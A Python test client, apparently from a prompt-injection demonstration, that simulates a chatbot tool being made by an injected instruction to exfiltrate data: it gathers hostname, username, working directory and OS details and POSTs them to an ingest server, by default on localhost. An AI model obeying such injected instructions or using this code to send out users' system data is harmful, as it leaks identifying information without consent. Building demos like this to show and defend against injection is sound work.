#!/usr/bin/env python3
"""Simulate the Phase-B exfil tool against a running curl-log server.

Collects *public* system / browser-style details (nothing sensitive) and POSTs
them as JSON to the ingest endpoint — mimicking what the injected instruction
would make the chatbot's tool do. For local demo use only.

Usage:
    python test_exfil.py                       # -> http://localhost:8000/ingest
    python test_exfil.py http://host:8000/ingest
    python test_exfil.py --count 3             # send N entries
"""
import argparse
import getpass
import json
import os
import platform
import socket
import sys
import urllib.request
from datetime import datetime, timezone

DEFAULT_URL = "http://localhost:8000/ingest"


def collect_system_info() -> dict:
    """Public, non-sensitive system/browser-style metadata."""
    uname = platform.uname()
    return {
        "collected_at": datetime.now(timezone.utc).isoformat(),
        "os": platform.system(),
        "os_release": platform.release(),
        "os_version": platform.version(),
        "platform": platform.platform(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": uname.node or socket.gethostname(),
        "python_version": platform.python_version(),
        "user": getpass.getuser(),
        "cwd": os.getcwd(),
        # A synthetic user-agent-like string to mimic a browser fingerprint.
        "user_agent": f"DaxaDemoClient/1.0 ({platform.system()} {platform.release()})",
    }


def send(url: str, payload: dict) -> None:
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url, data=data, headers={"Content-Type": "application/json"}, method="POST"
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        body = resp.read().decode("utf-8", errors="replace")
        print(f"[{resp.status}] {url} -> {body}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Exfil-demo test client")
    parser.add_argument("url", nargs="?", default=DEFAULT_URL, help="Ingest endpoint URL")
    parser.add_argument("--count", type=int, default=1, help="How many entries to send")
    args = parser.parse_args()

    info = collect_system_info()
    print("Collected system info:")
    print(json.dumps(info, indent=2))
    print(f"\nPOSTing {args.count} entr{'y' if args.count == 1 else 'ies'} to {args.url} …")

    for i in range(args.count):
        payload = dict(info)
        if args.count > 1:
            payload["_seq"] = i + 1
        try:
            send(args.url, payload)
        except Exception as exc:
            print(f"  FAILED: {exc}", file=sys.stderr)
            return 1
    print("\nDone. Check the viewer to confirm the entries appeared live.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
